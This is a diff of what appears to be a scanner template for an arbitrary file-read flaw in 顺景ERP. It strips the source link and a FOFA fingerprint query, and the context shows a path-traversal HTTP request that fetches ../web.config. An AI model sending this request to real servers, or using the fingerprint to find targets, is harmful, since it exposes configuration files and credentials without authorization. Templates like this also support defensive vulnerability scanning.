@@ -3,12 +3,8 @@ info:
   name: 顺景ERP GetFile任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fpgvn66sg3aacp25'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fpgvn66sg3aacp25
-    fofa: body="api/DBRecord/getDBRecords"
 http:
 - raw:
   - 'GET /api/Download/GetFile?FileName=../web.config&Title=123 HTTP/1.1
